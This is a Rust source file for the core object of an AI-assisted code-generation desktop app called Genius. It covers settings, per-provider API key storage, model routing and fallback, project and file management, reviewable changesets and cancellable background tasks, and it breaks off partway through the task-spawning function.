//! The `Genius` application core: one object that owns persistence, events, secrets,
//! processes, approvals and running tasks. The Tauri layer exposes its methods as IPC
//! commands; integration tests drive exactly the same methods.

use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use tokio_util::sync::CancellationToken;

use crate::approvals::Approvals;
use crate::blocks::{collect, BlockEvent, BlockParser};
use crate::changes::{compute_changes, ChangeStore, Changeset, FileChange};
use crate::context::{self, ContextPlan, ContextRequest};
use crate::db::{now, Db, ProjectRow};
use crate::diagnostics;
use crate::error::{GeniusError, Result};
use crate::events::{channels, EventBus, EventKind, EventStatus};
use crate::nvidia::{ChatMessage, ChatOptions, ChatResult, ModelInfo, NvidiaClient, ParamMemory, ProbeResult, ProviderError};
use crate::process::{Operation, ProcessManager, RunOutcome};
use crate::prompts;
use crate::router::ModelRole;
use crate::scaffold;
use crate::secrets::{self, SecretStore};
use crate::settings::{Effort, Policy, Settings};
use crate::spec::{self, ProjectSpec};
use crate::workspace::Workspace;

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TaskInfo {
    pub id: String,
    pub project_id: String,
    pub kind: String,
    pub title: String,
    pub started_at: String,
}

struct TaskEntry {
    info: TaskInfo,
    cancel: CancellationToken,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct KeyStatus {
    pub stored: bool,
    pub hint: Option<String>,
    pub backend: String,
    pub error: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ModelList {
    pub models: Vec<ModelInfo>,
    pub fetched_at: Option<String>,
    /// "live" (just fetched) or "cache"
    pub source: String,
    pub stale: bool,
    pub base_url: String,
    pub probes: HashMap<String, ProbeResult>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ReadinessCheck {
    pub id: String,
    pub label: String,
    /// "pass" | "fail" | "warn" | "unknown"
    pub status: String,
    pub detail: String,
}

/// Model rounds `generate` may spend: the first answer plus targeted completions.
const GENERATE_ROUNDS: usize = 6;

/// Plain-language names of the stages of a generation, for the activity log.
fn stage_label(stage: &str) -> &'static str {
    match stage {
        "generate" => "Writing code",
        "apply" => "Applying files",
        "build" => "Install and build",
        "preview" => "Preview",
        "runtime" => "Runtime check",
        "verify" => "Verification",
        _ => "Stage",
    }
}

/// What a generated project still lacks: files that must be (re)written and problems found.
#[derive(Debug, Default)]
pub(crate) struct Gaps {
    pub must_write: Vec<String>,
    pub notes: Vec<String>,
    pub unresolved: usize,
}

impl Gaps {
    pub fn is_complete(&self) -> bool {
        self.must_write.is_empty() && self.notes.is_empty()
    }

    pub fn summary(&self) -> String {
        let mut parts: Vec<String> = self.must_write.clone();
        if self.unresolved > 0 {
            parts.push(format!("{} import(s) pointing at files that were never written", self.unresolved));
        }
        parts.join(", ")
    }

    pub fn json(&self) -> Value {
        json!({ "mustWrite": self.must_write, "unresolvedImports": self.unresolved, "notes": self.notes })
    }
}

/// Per-call routing and budget overrides for [`Genius::ai_call_opts`]; unset fields come from
/// the settings (effort, thinking, temperature) and the role's defaults.
#[derive(Debug, Clone, Default)]
pub struct CallOptions {
    pub role: Option<ModelRole>,
    pub effort: Option<Effort>,
    pub max_tokens: Option<u32>,
    pub thinking: Option<bool>,
    pub temperature: Option<f32>,
    /// Use exactly this model (custom agents with a manual model policy); no routing.
    pub model: Option<String>,
    /// Try these models in this order instead of routing by role; later ones are used only when an
    /// earlier one fails (unlike [`model`](Self::model), which allows no fallback).
    pub chain: Option<Vec<String>>,
}

impl CallOptions {
    pub fn role(role: ModelRole) -> Self {
        Self { role: Some(role), ..Default::default() }
    }
}

/// Running token totals of a task's AI calls.
#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct UsageTotals {
    pub prompt_tokens: u64,
    pub completion_tokens: u64,
    pub total_tokens: u64,
    pub calls: u64,
    pub models: Vec<String>,
}

/// (prompt, completion, total) tokens from an OpenAI-style `usage` object.
pub fn usage_tokens(u: &Value) -> (u64, u64, u64) {
    let n = |k: &str| u.get(k).and_then(|v| v.as_u64()).unwrap_or(0);
    let (p, c) = (n("prompt_tokens"), n("completion_tokens"));
    (p, c, u.get("total_tokens").and_then(|v| v.as_u64()).unwrap_or(p + c))
}

/// Output budget and reasoning switch for an effort level. Quick utility calls stay small and
/// never think (speed); nothing exceeds 4× the user's max-tokens setting.
pub fn effort_budget(effort: Effort, role: ModelRole, s: &Settings) -> (u32, bool) {
    let (tokens, thinking) = match effort {
        Effort::Fast => (8192, false),
        Effort::Balanced => (16384, s.thinking),
        Effort::Max => (32768, s.thinking),
    };
    let tokens = match (role, effort) {
        (ModelRole::Quick, _) => tokens.min(4096),
        (_, Effort::Fast) => tokens,
        _ => tokens.max(s.max_tokens),
    };
    // Everyday chat reasons only at Max: a visible chat answer should start within seconds, and
    // measured live requests spent most of their time in hidden reasoning.
    let thinking = thinking && !(role == ModelRole::Chat && effort != Effort::Max);
    (tokens.min(s.max_tokens.saturating_mul(4)).max(256), thinking && role != ModelRole::Quick)
}

/// Why a failed call should move on to the next model (None: the error is not model-specific).
/// Manual mode only falls back when the chosen model is unavailable or cannot take the request
/// (context window too small).
fn fallback_reason(e: &GeniusError, manual: bool) -> Option<String> {
    let GeniusError::Provider(p) = e else { return None };
    match p {
        ProviderError::ModelUnavailable { status, .. } => Some(format!("it is not available to this key (HTTP {status})")),
        ProviderError::BadRequest { message, .. } if crate::model_stats::is_context_overflow(message) => Some("the request does not fit its context window".into()),
        _ if manual => None,
        ProviderError::RateLimited { .. } => Some("it is rate limited right now".into()),
        ProviderError::Server { status, .. } => Some(format!("its server returned an error (HTTP {status})")),
        ProviderError::Timeout(_) => Some("it timed out".into()),
        ProviderError::BadRequest { status, .. } => Some(format!("it rejected the request (HTTP {status})")),
        ProviderError::Malformed(_) => Some("it sent a broken reply".into()),
        _ => None,
    }
}

pub struct Genius {
    pub db: Arc<Db>,
    pub bus: EventBus,
    pub secrets: Arc<dyn SecretStore>,
    pub procs: ProcessManager,
    pub approvals: Approvals,
    tasks: Arc<Mutex<HashMap<String, TaskEntry>>>,
    previews: Arc<Mutex<HashMap<String, String>>>,
    repair_history: Arc<Mutex<HashMap<String, Vec<String>>>>,
    pub(crate) runtime_errors: crate::runtime_errors::Store,
    /// Preview inspections waiting for the window's answer (see `inspection.rs`).
    pub(crate) inspections: crate::inspection::Pending,
    /// Models that answered "unavailable" this session; routing skips them.
    pub(crate) failed_models: Mutex<HashSet<String>>,
    /// When the model list was last fetched (or tried) for routing because there was no cache.
    pub(crate) models_fetch_at: Mutex<Option<Instant>>,
    /// Observed per-model performance (persisted; see [`crate::model_stats`]).
    pub(crate) model_stats: crate::model_stats::StatsCache,
    /// Effort chosen for a running task by [`Genius::plan_work`] (routing and output budget).
    pub(crate) task_effort: Mutex<HashMap<String, Effort>>,
    /// Optional request parameters each model rejected (shared by every client).
    param_memory: ParamMemory,
    /// Custom agents / missions runtime state (see `custom_agents.rs`, `missions.rs`).
    pub(crate) agents: crate::custom_agents::AgentsRuntime,
    /// Token usage per task (in memory, bounded).
    usage: Mutex<HashMap<String, UsageTotals>>,
    /// Descriptions a vision model gave of images (hash of the image data → model, text), so an
    /// agent loop that re-sends the same screenshot every step describes it once. Bounded.
    image_descriptions: Mutex<Vec<(u64, String, String)>>,
    /// What outbound web fetches may reach (public internet only, except in tests; see web.rs).
    pub(crate) web_policy: Mutex<crate::web::WebPolicy>,
    data_dir: PathBuf,
    /// Runtime used for background work. Captured at construction so tasks can be spawned
    /// from any thread (Tauri runs synchronous commands on the main thread, outside Tokio).
    rt: tokio::runtime::Handle,
}

impl Genius {
    pub fn new(data_dir: &Path, emitter: Arc<dyn crate::events::Emitter>, secrets: Arc<dyn SecretStore>) -> Result<Arc<Self>> {
        std::fs::create_dir_all(data_dir)?;
        crate::updater::finish_update(); // this version started: drop the AppImage backup and stale update downloads
        let db = Arc::new(Db::open(&data_dir.join("genius.db"))?);
        Self::with_db(db, data_dir, emitter, secrets)
    }

    pub fn with_db(db: Arc<Db>, data_dir: &Path, emitter: Arc<dyn crate::events::Emitter>, secrets: Arc<dyn SecretStore>) -> Result<Arc<Self>> {
        crate::research::ensure_schema(&db)?; // chat/research tables (idempotent)
        crate::sync::ensure_schema(&db)?; // account sync outbox and triggers (idempotent)
        let bus = EventBus::new(db.clone(), emitter);
        // A previous session may have been killed: never show stale "running" states.
        bus.close_stale()?;
        db.mark_orphaned_runs()?;
        crate::custom_agents::seed_builtins(&db)?;
        crate::missions::recover(&db, data_dir)?;
        let procs = ProcessManager::new(db.clone(), bus.clone());
        let rt = tokio::runtime::Handle::try_current().map_err(|_| GeniusError::Internal("Genius must be created inside a Tokio runtime".into()))?;
        Ok(Arc::new(Self {
            rt,
            db,
            bus,
            secrets,
            procs,
            approvals: Approvals::default(),
            tasks: Arc::new(Mutex::new(HashMap::new())),
            previews: Arc::new(Mutex::new(HashMap::new())),
            repair_history: Arc::new(Mutex::new(HashMap::new())),
            runtime_errors: Default::default(),
            inspections: Default::default(),
            failed_models: Mutex::new(HashSet::new()),
            models_fetch_at: Mutex::new(None),
            model_stats: Default::default(),
            task_effort: Mutex::new(HashMap::new()),
            param_memory: ParamMemory::default(),
            agents: Default::default(),
            usage: Mutex::new(HashMap::new()),
            image_descriptions: Mutex::new(Vec::new()),
            web_policy: Mutex::new(crate::web::WebPolicy::default()),
            data_dir: data_dir.to_path_buf(),
        }))
    }

    pub fn runtime(&self) -> &tokio::runtime::Handle {
        &self.rt
    }

    pub fn data_dir(&self) -> &Path {
        &self.data_dir
    }

    // ===================================================================== settings

    pub fn settings(&self) -> Result<Settings> {
        Settings::load(&self.db)
    }

    pub fn save_settings(&self, s: &Settings) -> Result<Settings> {
        s.save(&self.db)?;
        self.bus.record(None, None, EventKind::Task, EventStatus::Completed, "Settings saved", json!({}));
        Ok(s.clone())
    }

    pub fn workspace_dir(&self) -> Result<PathBuf> {
        Ok(match self.settings()?.workspace_dir {
            Some(d) if !d.trim().is_empty() => PathBuf::from(d),
            _ => self.data_dir.join("projects"),
        })
    }

    // ===================================================================== NVIDIA key + models

    /// The provider selected in Settings (an unknown saved id behaves as NVIDIA).
    pub fn provider_kind(&self) -> crate::provider::ProviderKind {
        crate::provider::ProviderKind::from_id_or_default(&self.settings().map(|s| s.provider).unwrap_or_default())
    }

    /// Credential-store entry of the selected provider: every provider has its own key slot, so
    /// switching provider never sends one provider's key to another.
    fn key_name(&self) -> String {
        self.provider_kind().key_name()
    }

    pub fn key_status(&self) -> KeyStatus {
        match self.secrets.get(&self.key_name()) {
            Ok(v) => KeyStatus { stored: v.is_some(), hint: v.as_deref().map(secrets::mask), backend: self.secrets.backend_name().into(), error: None },
            Err(e) => KeyStatus { stored: false, hint: None, backend: self.secrets.backend_name().into(), error: Some(e.to_string()) },
        }
    }

    pub fn save_api_key(&self, key: &str) -> Result<KeyStatus> {
        let key = secrets::validate_nvidia_key(key)?;
        let name = self.key_name();
        self.secrets.set(&name, &key)?;
        // read back to prove the OS store actually persisted it
        let stored = self.secrets.get(&name)?;
        if stored.as_deref() != Some(key.as_str()) {
            return Err(GeniusError::Secret("the credential store did not return the saved key".into()));
        }
        self.bus.record(None, None, EventKind::Task, EventStatus::Completed, format!("{} API key saved to system credential store", self.provider_kind().label()), json!({ "backend": self.secrets.backend_name(), "hint": secrets::mask(&key) }));
        Ok(self.key_status())
    }

    fn key_slot(provider: &str) -> Result<String> {
        crate::provider::ProviderKind::from_id(provider).map(|k| k.key_name()).ok_or_else(|| GeniusError::Validation(format!("unknown provider '{provider}'")))
    }

    /// The key saved for one provider (used to copy it into the account's encrypted key vault; the user opted in).
    pub fn api_key_for(&self, provider: &str) -> Result<Option<String>> {
        self.secrets.get(&Self::key_slot(provider)?)
    }

    /// Save a key for a specific provider (a key that arrived from the account's key vault).
    pub fn save_api_key_for(&self, provider: &str, key: &str) -> Result<()> {
        let key = secrets::validate_nvidia_key(key)?;
        let name = Self::key_slot(provider)?;
        self.secrets.set(&name, &key)?;
        if self.secrets.get(&name)?.as_deref() != Some(key.as_str()) {
            return Err(GeniusError::Secret("the credential store did not return the saved key".into()));
        }
        self.bus.record(None, None, EventKind::Task, EventStatus::Completed, format!("{provider} API key saved to system credential store (from the account key vault)"), json!({ "backend": self.secrets.backend_name(), "hint": secrets::mask(&key) }));
        Ok(())
    }

    pub fn remove_api_key_for(&self, provider: &str) -> Result<()> {
        self.secrets.delete(&Self::key_slot(provider)?)
    }

    pub fn remove_api_key(&self) -> Result<KeyStatus> {
        self.secrets.delete(&self.key_name())?;
        self.bus.record(None, None, EventKind::Task, EventStatus::Completed, format!("{} API key removed", self.provider_kind().label()), json!({}));
        Ok(self.key_status())
    }

    pub(crate) fn client(&self) -> Result<(NvidiaClient, Settings)> {
        let s = self.settings()?;
        let kind = crate::provider::ProviderKind::from_id_or_default(&s.provider);
        let key = self.secrets.get(&kind.key_name())?;
        let mut client = NvidiaClient::new(&s.base_url, key)?.with_kind(kind).with_param_memory(self.param_memory.clone());
        client.max_retries = s.limits.max_provider_retries;
        Ok((client, s))
    }

    pub async fn test_connection(&self) -> Result<Value> {
        let (client, s) = self.client()?;
        // Auto mode verifies the model Genius would use for agent work.
        let model = if s.is_auto() && self.key_status().stored { self.resolve_models(ModelRole::Agent, s.effort).await.ok().and_then(|c| c.into_iter().next()).or(s.model.clone()) } else { s.model.clone() };
        let mut ev = self.bus.start(None, None, EventKind::Ai, EventStatus::Running, format!("Testing {} connection", client.kind().label()), json!({ "baseUrl": client.base_url(), "model": model, "modelMode": s.model_mode }));
        let res = client.test_connection(model.as_deref()).await.map_err(GeniusError::from);
        match &res {
            Ok(v) => {
                if let Some(p) = v.get("probe") {
                    if let Ok(p) = serde_json::from_value::<ProbeResult>(p.clone()) {
                        self.record_probe(&p);
                        self.store_probe(p)?;
                    }
                }
                ev.update(EventStatus::Completed, v.clone());
            }
            Err(e) => {
                ev.update(EventStatus::Failed, json!({ "error": { "kind": e.kind(), "message": e.to_string() } }));
            }
        }
        res
    }

    pub(crate) fn probes(&self) -> HashMap<String, ProbeResult> {
        self.db.get_setting("model_probes").ok().flatten().and_then(|v| serde_json::from_value(v).ok()).unwrap_or_default()
    }

    pub(crate) fn store_probe(&self, p: ProbeResult) -> Result<()> {
        let mut all = self.probes();
        all.insert(p.model.clone(), p);
        self.db.set_setting("model_probes", &serde_json::to_value(all)?)
    }

    pub async fn list_models(&self, refresh: bool) -> Result<ModelList> {
        let (client, _) = self.client()?;
        let base = client.base_url().to_string();
        if !refresh {
            if let Some((ts, v)) = self.db.get_model_cache(&base)? {
                let models: Vec<ModelInfo> = serde_json::from_value(v).unwrap_or_default();
                let stale = chrono::DateTime::parse_from_rfc3339(&ts).map(|t| chrono::Utc::now().signed_duration_since(t).num_hours() >= 24).unwrap_or(true);
                return Ok(ModelList { models, fetched_at: Some(ts), source: "cache".into(), stale, base_url: base, probes: self.probes() });
            }
        }
        let mut ev = self.bus.start(None, None, EventKind::Ai, EventStatus::Running, format!("Fetching {} model list", client.kind().label()), json!({ "endpoint": format!("{base}/models") }));
        match client.list_models().await {
            Ok(models) => {
                let ts = self.db.put_model_cache(&base, &serde_json::to_value(&models)?)?;
                ev.update(EventStatus::Completed, json!({ "count": models.len() }));
                Ok(ModelList { models, fetched_at: Some(ts), source: "live".into(), stale: false, base_url: base, probes: self.probes() })
            }
            Err(e) => {
                let e = GeniusError::from(e);
                ev.update(EventStatus::Failed, json!({ "error": { "kind": e.kind(), "message": e.to_string() } }));
                Err(e)
            }
        }
    }

    pub async fn probe_model(&self, model: &str) -> Result<ProbeResult> {
        let (client, _) = self.client()?;
        let mut ev = self.bus.start(None, None, EventKind::Ai, EventStatus::Running, format!("Verifying model {model}"), json!({ "model": model }));
        match client.probe_model(model, &CancellationToken::new()).await {
            Ok(p) => {
                self.record_probe(&p);
                self.store_probe(p.clone())?;
                ev.update(EventStatus::Completed, serde_json::to_value(&p)?);
                Ok(p)
            }
            Err(e) => {
                self.record_provider_error(model, &e, None);
                let e = GeniusError::from(e);
                ev.update(EventStatus::Failed, json!({ "error": { "kind": e.kind(), "message": e.to_string() } }));
                Err(e)
            }
        }
    }

    pub fn select_model(&self, model: &str) -> Result<Settings> {
        if model.trim().is_empty() || model.len() > 200 || model.chars().any(char::is_whitespace) {
            return Err(GeniusError::Validation("invalid model id".into()));
        }
        let mut s = self.settings()?;
        s.model = Some(model.to_string());
        s.save(&self.db)?;
        self.bus.record(None, None, EventKind::Ai, EventStatus::Completed, format!("Selected model {model}"), json!({ "model": model }));
        Ok(s)
    }

    // ===================================================================== projects

    pub fn list_projects(&self) -> Result<Vec<ProjectRow>> {
        self.db.list_projects()
    }

    pub fn project(&self, id: &str) -> Result<ProjectRow> {
        self.db.get_project(id)
    }

    pub fn workspace(&self, project_id: &str) -> Result<Workspace> {
        let p = self.db.get_project(project_id)?;
        let path = PathBuf::from(&p.path);
        if !path.is_dir() {
            return Err(GeniusError::NotFound(format!("the project folder no longer exists: {}", p.path)));
        }
        Workspace::new(path)
    }

    pub fn create_project(&self, name: &str, description: &str) -> Result<ProjectRow> {
        let name = name.trim();
        if name.is_empty() || name.len() > 80 {
            return Err(GeniusError::Validation("Project name must be 1–80 characters.".into()));
        }
        let base = self.workspace_dir()?;
        std::fs::create_dir_all(&base)?;
        let slug = scaffold::slugify(name);
        let mut dir = base.join(&slug);
        let mut n = 2;
        while dir.exists() {
            dir = base.join(format!("{slug}-{n}"));
            n += 1;
        }
        std::fs::create_dir_all(&dir)?;
        let dir = dir.canonicalize()?;
        let p = ProjectRow {
            id: uuid::Uuid::new_v4().to_string(),
            name: name.into(),
            description: description.trim().into(),
            path: dir.to_string_lossy().into(),
            kind: scaffold::KIND_VITE_REACT.into(),
            spec: None,
            notes: String::new(),
            status: json!({ "stage": "created" }),
            created_at: now(),
            updated_at: now(),
            last_opened_at: Some(now()),
        };
        self.db.insert_project(&p)?;
        self.bus.record(Some(&p.id), None, EventKind::Task, EventStatus::Completed, format!("Created project {}", p.name), json!({ "path": p.path }));
        Ok(p)
    }

    /// Register an existing folder (e.g. a cloned repository) as a project.
    pub fn import_project(&self, path: &str, name: Option<&str>) -> Result<ProjectRow> {
        let dir = PathBuf::from(path).canonicalize().map_err(|_| GeniusError::NotFound(format!("folder {path}")))?;
        if !dir.is_dir() {
            return Err(GeniusError::Validation("Choose a folder.".into()));
        }
        if self.data_dir.starts_with(&dir) {
            return Err(GeniusError::Validation("That folder contains Genius's own data; choose a project folder.".into()));
        }
        let path_s = dir.to_string_lossy().to_string();
        if let Some(existing) = self.db.find_project_by_path(&path_s)? {
            return Ok(existing);
        }
        let pkg = std::fs::read_to_string(dir.join("package.json")).ok();
        let kind = match &pkg {
            Some(p) if p.contains("\"vite\"") => scaffold::KIND_VITE_REACT,
            Some(_) => "node",
            None => "unknown",
        };
        let name = name.map(String::from).unwrap_or_else(|| dir.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_else(|| "Project".into()));
        let p = ProjectRow {
            id: uuid::Uuid::new_v4().to_string(),
            name,
            description: String::new(),
            path: path_s,
            kind: kind.into(),
            spec: None,
            notes: String::new(),
            status: json!({ "stage": "imported" }),
            created_at: now(),
            updated_at: now(),
            last_opened_at: Some(now()),
        };
        self.db.insert_project(&p)?;
        self.bus.record(Some(&p.id), None, EventKind::Task, EventStatus::Completed, format!("Opened folder {}", p.path), json!({ "kind": kind }));
        Ok(p)
    }

    pub fn open_project(&self, id: &str) -> Result<ProjectRow> {
        self.db.touch_project_opened(id)?;
        self.db.get_project(id)
    }

    pub fn update_project_meta(&self, id: &str, name: &str, description: &str, notes: &str) -> Result<ProjectRow> {
        if name.trim().is_empty() {
            return Err(GeniusError::Validation("Project name is required.".into()));
        }
        self.db.rename_project(id, name.trim(), description)?;
        self.db.update_project_notes(id, notes)?;
        self.db.get_project(id)
    }

    /// Delete a project from Genius. Files are deleted only when requested *and* the folder
    /// is inside Genius's workspace directory; imported folders are only unregistered.
    pub async fn delete_project(&self, id: &str, delete_files: bool) -> Result<Value> {
        let p = self.db.get_project(id)?;
        self.procs.stop_project(id).await;
        self.cancel_project_tasks(id);
        let dir = PathBuf::from(&p.path);
        let managed = self.workspace_dir()?.canonicalize().ok().is_some_and(|w| dir.starts_with(&w) && dir != w);
        let mut files_deleted = false;
        if delete_files {
            if !managed {
                return Err(GeniusError::Validation(
                    "This project folder is outside the Genius workspace, so Genius will not delete its files. Remove it from Genius without deleting files instead.".into(),
                ));
            }
            if dir.is_dir() {
                std::fs::remove_dir_all(&dir)?;
                files_deleted = true;
            }
        }
        self.db.delete_project(id)?;
        self.bus.record(None, None, EventKind::Task, EventStatus::Completed, format!("Deleted project {}", p.name), json!({ "filesDeleted": files_deleted, "path": p.path }));
        Ok(json!({ "filesDeleted": files_deleted }))
    }

    // ===================================================================== files

    pub fn list_files(&self, project_id: &str) -> Result<Vec<crate::workspace::FileEntry>> {
        self.workspace(project_id)?.list_files()
    }

    pub fn read_file(&self, project_id: &str, path: &str) -> Result<String> {
        self.workspace(project_id)?.read_text(path)
    }

    pub fn search_files(&self, project_id: &str, query: &str) -> Result<Vec<crate::workspace::SearchHit>> {
        self.workspace(project_id)?.search(query, 200)
    }

    /// Save from the editor: recorded as a "manual" changeset so it can be reverted.
    pub fn save_file(&self, project_id: &str, path: &str, content: &str) -> Result<Option<Changeset>> {
        let ws = self.workspace(project_id)?;
        let cs = ChangeStore::new(&self.db).record_manual(&ws, project_id, path, content)?;
        if let Some(cs) = &cs {
            self.emit_applied(project_id, None, cs);
        }
        Ok(cs)
    }

    pub fn delete_file(&self, project_id: &str, path: &str) -> Result<Changeset> {
        let ws = self.workspace(project_id)?;
        let store = ChangeStore::new(&self.db);
        let changes = compute_changes(&ws, &[], &[path.to_string()])?;
        if changes.is_empty() {
            return Err(GeniusError::NotFound(path.into()));
        }
        let cs = store.create(project_id, None, "manual", &format!("Deleted {path}"), "Deleted from the file explorer", &changes)?;
        let cs = store.apply(&ws, &cs.id)?;
        self.emit_applied(project_id, None, &cs);
        Ok(cs)
    }

    // ===================================================================== changesets

    pub fn list_changesets(&self, project_id: &str) -> Result<Vec<Changeset>> {
        ChangeStore::new(&self.db).list(project_id, 300)
    }

    pub fn changeset(&self, id: &str) -> Result<(Changeset, Vec<FileChange>)> {
        let s = ChangeStore::new(&self.db);
        Ok((s.get(id)?, s.files(id)?))
    }

    fn emit_applied(&self, project_id: &str, task_id: Option<&str>, cs: &Changeset) {
        for f in &cs.files {
            let verb = match f.op.as_str() {
                "create" => "Created",
                "delete" => "Deleted",
                _ => "Updated",
            };
            self.bus.record(Some(project_id), task_id, EventKind::FileWrite, EventStatus::Completed, format!("{verb} {}", f.path), json!({ "changesetId": cs.id, "path": f.path, "op": f.op, "added": f.added, "removed": f.removed }));
        }
        self.bus.push(channels::FS_CHANGED, json!({ "projectId": project_id, "paths": cs.files.iter().map(|f| f.path.clone()).collect::<Vec<_>>() }));
    }

    pub(crate) fn apply_changeset_inner(&self, project_id: &str, task_id: Option<&str>, id: &str) -> Result<Changeset> {
        let ws = self.workspace(project_id)?;
        let store = ChangeStore::new(&self.db);
        let mut ev = self.bus.start(Some(project_id), task_id, EventKind::Changeset, EventStatus::Running, "Applying changes", json!({ "changesetId": id }));
        match store.apply(&ws, id) {
            Ok(cs) => {
                store.mark_reverted_if_restore(&cs)?;
                self.clear_pending(project_id, id);
                self.bus.resolve_changeset(id, EventStatus::Completed, "applied");
                self.clear_preview_errors(project_id); // the code changed: old runtime errors are stale
                ev.set_title(format!("Applied: {}", cs.title));
                ev.update(EventStatus::Completed, json!({ "files": cs.files.len() }));
                self.emit_applied(project_id, task_id, &cs);
                Ok(cs)
            }
            Err(e) => {
                ev.update(EventStatus::Failed, json!({ "error": { "kind": e.kind(), "message": e.to_string() } }));
                Err(e)
            }
        }
    }

    /// User approved a proposed changeset. If it came from the AI and verification is
    /// enabled, the build runs afterwards (in the background) to check the result.
    pub fn apply_changeset(self: &Arc<Self>, id: &str) -> Result<Changeset> {
        let (cs, _) = self.changeset(id)?;
        let applied = self.apply_changeset_inner(&cs.project_id, cs.task_id.as_deref(), id)?;
        let settings = self.settings()?;
        if settings.verify_after_apply && matches!(applied.kind.as_str(), "generate" | "change" | "repair") {
            let me = self.clone();
            let pid = applied.project_id.clone();
            let generated = applied.kind == "generate";
            self.spawn_task(&applied.project_id, "verify", if generated { "Build and check the generated app" } else { "Verify changes with a production build" }, move |task_id, cancel| async move {
                if generated {
                    me.verify_applied_generation(&pid, &task_id, &cancel).await
                } else {
                    me.verify_pipeline(&pid, &task_id, &cancel, false).await
                }
            })?;
        }
        Ok(applied)
    }

    /// Forget a proposal that is no longer pending (applied or discarded).
    fn clear_pending(&self, project_id: &str, changeset_id: &str) {
        if let Ok(p) = self.db.get_project(project_id) {
            if p.status.get("pendingChangeset").and_then(|v| v.as_str()) == Some(changeset_id) {
                let _ = self.db.patch_project_status(project_id, &json!({ "pendingChangeset": null }));
            }
        }
    }

    /// The generated files were applied after a review: build them, start the preview and look at
    /// it in a real browser, then record how far it got (the same states `generate` reports).
    pub(crate) async fn verify_applied_generation(&self, project_id: &str, task_id: &str, cancel: &CancellationToken) -> Result<Value> {
        let verify = self.verify_pipeline_opts(project_id, task_id, cancel, true, false).await?;
        let built = verify["ok"] == json!(true);
        let mut runtime = Value::Null;
        let mut state = if built {
            "built"
        } else if verify["placeholder"] == json!(true) {
            "incomplete"
        } else {
            "build_failed"
        };
        if built {
            match verify["previewUrl"].as_str() {
                Some(url) => {
                    runtime = self.runtime_verify(project_id, task_id, url).await;
                    state = match runtime["status"].as_str() {
                        Some("verified") => "verified",
                        Some("problems") => "runtime_errors",
                        _ => "built",
                    };
                }
                None => state = "preview_failed",
            }
        }
        let mut patch = json!({ "generation": { "state": state, "at": now() } });
        patch["stage"] = json!(if state == "incomplete" { "generation_incomplete" } else { "generated" });
        self.db.patch_project_status(project_id, &patch)?;
        Ok(json!({ "state": state, "verify": verify, "runtime": runtime }))
    }

    pub fn reject_changeset(&self, id: &str) -> Result<Changeset> {
        let cs = ChangeStore::new(&self.db).reject(id)?;
        self.clear_pending(&cs.project_id, id);
        self.bus.resolve_changeset(id, EventStatus::Cancelled, "rejected");
        self.bus.record(Some(&cs.project_id), cs.task_id.as_deref(), EventKind::Changeset, EventStatus::Cancelled, format!("Rejected: {}", cs.title), json!({ "changesetId": cs.id }));
        Ok(cs)
    }

    pub fn propose_revert(&self, id: &str, force: bool) -> Result<Changeset> {
        let (cs, _) = self.changeset(id)?;
        let ws = self.workspace(&cs.project_id)?;
        let r = ChangeStore::new(&self.db).propose_revert(&ws, id, force)?;
        self.bus.record(Some(&cs.project_id), None, EventKind::Changeset, EventStatus::AwaitingApproval, format!("Proposed: {}", r.title), json!({ "changesetId": r.id }));
        Ok(r)
    }

    pub fn propose_restore_to(&self, id: &str) -> Result<Changeset> {
        let (cs, _) = self.changeset(id)?;
        let ws = self.workspace(&cs.project_id)?;
        let r = ChangeStore::new(&self.db).propose_restore_to(&ws, &cs.project_id, id)?;
        self.bus.record(Some(&cs.project_id), None, EventKind::Changeset, EventStatus::AwaitingApproval, format!("Proposed: {}", r.title), json!({ "changesetId": r.id }));
        Ok(r)
    }

    // ===================================================================== tasks

    pub fn active_tasks(&self, project_id: Option<&str>) -> Vec<TaskInfo> {
        self.tasks.lock().unwrap().values().map(|t| t.info.clone()).filter(|t| project_id.is_none_or(|p| t.project_id == p)).collect()
    }

    pub fn cancel_task(&self, task_id: &str) -> Result<()> {
        match self.tasks.lock().unwrap().get(task_id) {
            Some(t) => {
                t.cancel.cancel();
                Ok(())
            }
            None => Err(GeniusError::NotFound("task (it may have already finished)".into())),
        }
    }

    fn cancel_project_tasks(&self, project_id: &str) {
        for t in self.tasks.lock().unwrap().values() {
            if t.info.project_id == project_id {
                t.cancel.cancel();
            }
        }
    }

    /// Run a long operation in the background, tracked as a cancellable task with a
    /// persisted Task event whose final status reflects the real outcome.
    pub fn spawn_task<F, Fut>(self: &Arc<Self>, project_id: &str, kind: &str, title: &str, f: F) -> Result<TaskInfo>
    where
        F: FnOnce(String, CancellationToken) -> Fut + Send + 'static,
        Fut: std::future::Future<Output = Result<Value>> + Send + 'static,
    {
        // The hidden general workspace runs chat/research tasks only, never code tasks.
        if !matches!(kind, "chat" | "research" | "spec") && self.db.get_project(project_id).is_ok_and(|p| p.kind == crate::agent::chat_mode::GENERAL_KIND) {
            return Err(GeniusError::Validation("The general chat workspace is not a code project.".into()));
        }
        {
            let tasks = self.tasks.lock().unwrap();
            if let Some(t) = tasks.values().find(|t| t.info.project_id == project_id && t.info.kind != "verify" && kind != "verify") {
                return Err(GeniusError::Conflict(format!("'{}' is still running for this project. Wait for it or cancel it first.", t.info.title)));
            }
            let cap = self.settings().map(|s| s.limits.max_concurrent_tasks).unwrap_or(6) as usize;
            if kind != "verify" && tasks.values().filter(|t| t.info.kind != "verify").count() >= cap {
                return Err(GeniusError::Conflict(format!("{cap} tasks are already running (Settings → Limits → concurrent tasks). Wait for one to finish or cancel it.")));
            }
        }
        let info = TaskInfo { id: uuid::Uuid::new_v4().to_string(), project_id: project_id.into(), kind: kind.into(), title: title.into(), started_at: now() };
        let cancel = CancellationToken::new();
        self.tasks.lock().unwrap().insert(info.id.clone(), TaskEntry { info: info.clone(), cancel: cancel.clone() });
        let me = self.clone();
        let info2 = info.clone();
        self.rt.spawn(async move {
